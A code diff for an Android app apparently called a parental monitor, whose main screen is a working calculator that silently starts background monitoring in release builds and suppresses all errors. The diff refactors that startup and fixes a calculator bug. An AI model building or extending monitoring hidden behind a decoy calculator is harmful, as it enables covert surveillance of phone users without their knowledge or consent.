@@ -33,41 +33,9 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "MainActivity onCreate")
         if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "DEBUG mode")
-        
+
         preferencesManager = PreferencesManager.getInstance(this)
 
-        if (!BuildConfig.DEBUG) {
-            setContentView(R.layout.activity_calculator)
-            initCalculator()
-            if (savedInstanceState != null) {
-                currentNumber = savedInstanceState.getString("currentNumber", "")
-                previousNumber = savedInstanceState.getString("previousNumber", "")
-                operator = savedInstanceState.getString("operator", "")
-                lastExpression = savedInstanceState.getString("lastExpression", "")
-                justCalculated = savedInstanceState.getBoolean("justCalculated", false)
-                updateCalculatorDisplay()
-            }
-            try {
-                Thread {
-                    try {
-                        PreferencesManager.refreshInstance(this)
-                    } catch (_: Exception) {
-                    }
-                    try {
-                        preferencesManager = PreferencesManager.getInstance(this)
-                    } catch (_: Exception) {
-                    }
-                    try {
-                        startMonitoringInBackground()
-                    } catch (_: Exception) {
-                    }
-                }.start()
-            } catch (_: Exception) {
-            }
-            return
-        }
-
-        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Entering DEBUG mode - CALCULATOR UI")
         setContentView(R.layout.activity_calculator)
         initCalculator()
         if (savedInstanceState != null) {
@@ -77,6 +45,30 @@ class MainActivity : AppCompatActivity() {
             lastExpression = savedInstanceState.getString("lastExpression", "")
             justCalculated = savedInstanceState.getBoolean("justCalculated", false)
             updateCalculatorDisplay()
+        }
+        if (BuildConfig.DEBUG) {
+            android.util.Log.i("MainActivity", "Entering DEBUG mode - CALCULATOR UI")
+            return
+        }
+        try {
+            Thread {
+                try {
+                    PreferencesManager.refreshInstance(this)
+                } catch (_: Exception) {
+                }
+                runOnUiThread {
+                    try {
+                        preferencesManager = PreferencesManager.getInstance(this)
+                    } catch (_: Exception) {
+                    }
+                    if (isFinishing || isDestroyed) return@runOnUiThread
+                    try {
+                        startMonitoringInBackground()
+                    } catch (_: Exception) {
+                    }
+                }
+            }.start()
+        } catch (_: Exception) {
         }
     }
     
@@ -167,6 +159,7 @@ class MainActivity : AppCompatActivity() {
         operator = op
         previousNumber = currentNumber
         currentNumber = ""
+        justCalculated = false
         updateCalculatorDisplay()
     }
     
